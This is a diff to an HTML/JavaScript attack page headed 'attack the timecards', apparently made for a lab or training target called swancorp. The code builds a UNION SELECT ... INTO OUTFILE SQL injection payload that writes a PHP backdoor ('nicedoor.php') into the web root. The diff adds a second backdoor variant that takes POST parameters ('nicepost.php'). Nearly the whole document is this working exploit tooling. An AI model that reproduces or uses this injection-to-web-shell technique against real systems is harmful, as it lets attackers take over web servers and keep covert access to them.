@@ -22,7 +22,7 @@ function setTaTypeId() {
     var fc = document.getElementById("fcta0");
     var fn = document.getElementById("fninp0");
     var tid = document.getElementById("tid");
-    var frmet = document.getElementById("frmet");
+    // var frmet = document.getElementById("frmet");
     tid.value = ('7780699 union all select ' +
         sql_enc(fc.value) +" into OUTFILE '" +
         fn.value + "' FIELDS ESCAPED BY '' ;#");
@@ -49,6 +49,10 @@ function seter_cb(evt) {
         'nd-set-btn' :[
             ['fcta0',niceDoorStr],
             ['fninp0','/var/www/html/swancorp/nicedoor.php']
+        ],
+        'npost-set-btn' :[
+            ['fcta0',niceDoorStr.replace(/_GET/g, '_POST')],
+            ['fninp0','/var/www/html/swancorp/nicepost.php']
         ]
     }
     console.log(setvs[tid]);
@@ -57,7 +61,8 @@ function seter_cb(evt) {
         console.log(document.getElementById(vs[0])); */
         document.getElementById(vs[0]).value = vs[1];
     }
-    if ('nd-set-btn' === tid ) {setTaTypeId();}
+    // if ('nd-set-btn' === tid ) {setTaTypeId();}
+    if (evt.target.closest('form#frmet'))  {setTaTypeId();}
 }
  </script>
  <h1>attack the timecards</h1>
@@ -107,6 +112,8 @@ function seter_cb(evt) {
             <input type=button value='inject file' onclick="inject0_cb()" ></input>
             <input type="button" class=seterbtn value="set nicedoor defaults"
               id="nd-set-btn">
+              <input type="button" class=seterbtn value="set nicepost defaults"
+              id="npost-set-btn">
         </fieldset>
        <textarea name=type_id id=tid cols=120 rows=24 readonly ></textarea>
        
